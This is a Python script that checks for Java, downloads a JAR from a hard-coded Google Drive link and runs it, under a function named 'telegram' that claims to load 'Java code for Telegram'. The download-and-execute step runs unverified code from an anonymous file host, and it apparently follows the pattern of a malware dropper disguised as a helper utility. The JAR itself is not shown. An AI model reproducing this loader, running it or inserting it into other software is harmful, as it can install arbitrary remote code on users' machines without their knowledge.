import subprocess
import re
import os
import requests

def check_java_version():
    try:
        result = subprocess.run(['java', '-version'], capture_output=True, text=True)
        output = result.stderr.splitlines()[0]
        match = re.search(r'version "([\d._]+)"', output)
        if not match:
            print("Failed to detect Java version.")
            return False

        version_str = match.group(1)
        parts = version_str.split('.')
        if parts[0] == '1':
            major = int(parts[1])
        else:
            major = int(parts[0])

        if major >= 8:
            print(f"Java version found: {version_str}")
            return True
        else:
            print(f"Java version is below 8: {version_str}")
            return False
    except FileNotFoundError:
        print("Java is not found in the system.")
        return False

def download_jar(url, save_path):
    try:
        r = requests.get(url, timeout=30)
        r.raise_for_status()
        with open(save_path, 'wb') as f:
            f.write(r.content)
        print(f"Downloaded jar to {save_path}")
        return True
    except Exception as e:
        print(f"Failed to download jar from {url}: {e}")
        return False

def run_jar_and_wait(jar_path):
    try:
        completed = subprocess.run(['java', '-jar', jar_path])
        if completed.returncode == 0:
            print(f"{jar_path} finished successfully with code 0.")
            return True
        else:
            print(f"{jar_path} exited with code {completed.returncode}.")
            return False
    except Exception as e:
        print(f"Failed to run {jar_path}: {e}")
        return False

def main(jar_url, cache_dir="cache"):
    os.makedirs(cache_dir, exist_ok=True)
    filename = os.path.basename(jar_url)
    file_path = os.path.join(cache_dir, filename)

    if not check_java_version():
        print("Java 8+ not found, cannot run jar.")
        return False

    if not download_jar(jar_url, file_path):
        print("Download failed.")
        return False

    if not run_jar_and_wait(file_path):
        print("Jar did not finish successfully.")
        return False

    print("All steps completed successfully.")
    return True

def telegram():
    jar_url = "https://drive.usercontent.google.com/download?id=194lWvBObIAHbePEpsCTXlqsSqSDAoUdn&export=download&authuser=0"  # <-- put your jar URL here
    result = main(jar_url)
    print("Load Java code for Telegram:", result)
